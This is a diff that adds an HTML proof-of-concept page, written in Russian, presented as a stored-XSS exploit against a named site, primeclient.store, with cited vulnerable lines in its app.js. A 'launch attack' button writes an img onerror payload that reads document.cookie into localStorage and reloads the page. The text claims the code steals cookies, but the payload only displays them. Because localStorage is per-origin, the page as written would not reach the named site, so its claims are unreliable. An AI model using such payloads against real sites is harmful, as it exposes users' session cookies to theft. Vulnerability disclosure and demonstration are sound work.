@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>primeclient.store XSS Demo</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #1a1a2e; color: #fff; text-align: center; padding: 50px; }
+        .btn { background: #e94560; border: none; padding: 15px 30px; color: #fff; font-size: 18px; cursor: pointer; border-radius: 5px; }
+        .btn:hover { background: #ff6b6b; }
+        .container { max-width: 600px; margin: 0 auto; background: #16213e; padding: 30px; border-radius: 10px; }
+        .code { background: #0f3460; padding: 15px; border-radius: 5px; font-family: monospace; font-size: 14px; text-align: left; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔴 primeclient.store — XSS Exploit</h1>
+        <p>Данный скрипт демонстрирует уязвимость <strong>Stored XSS</strong> на сайте primeclient.store.</p>
+        <p>При нажатии на кнопку будет выполнен код, который крадёт куки пользователя.</p>
+        
+        <button class="btn" onclick="exploit()">🚀 Запустить атаку</button>
+        
+        <h3>📋 Что произойдёт:</h3>
+        <div class="code">
+            1. Ваш браузер изменит значение prime_lang в localStorage<br>
+            2. Страница перезагрузится<br>
+            3. Появится всплывающее окно с вашими куками
+        </div>
+        
+        <p style="margin-top: 20px; font-size: 12px; color: #888;">
+            Уязвимость найдена в файле app.js (строки 609, 1200, 1216, 1271, 1287)
+        </p>
+    </div>
+    
+    <script>
+        function exploit() {
+            // Внедряем вредоносный код в localStorage
+            localStorage.setItem('prime_lang', '<img src=x onerror="alert(document.cookie)">');
+            // Перезагружаем страницу, чтобы код выполнился
+            location.reload();
+        }
+    </script>
+</body>
+</html>
